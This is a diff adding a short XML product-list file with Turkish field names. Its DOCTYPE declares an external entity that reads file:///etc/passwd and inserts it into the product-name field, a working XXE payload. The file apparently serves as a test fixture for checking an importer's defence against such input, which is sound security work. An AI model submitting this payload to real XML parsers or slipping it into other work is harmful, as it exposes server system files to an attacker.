@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE Urunler [<!ENTITY secret SYSTEM "file:///etc/passwd">]>
+<Urunler><Urun><StokKodu>BM-001</StokKodu><UrunAdi>&secret;</UrunAdi><SatisFiyati>100,00</SatisFiyati><StokAdedi>12</StokAdedi></Urun></Urunler>
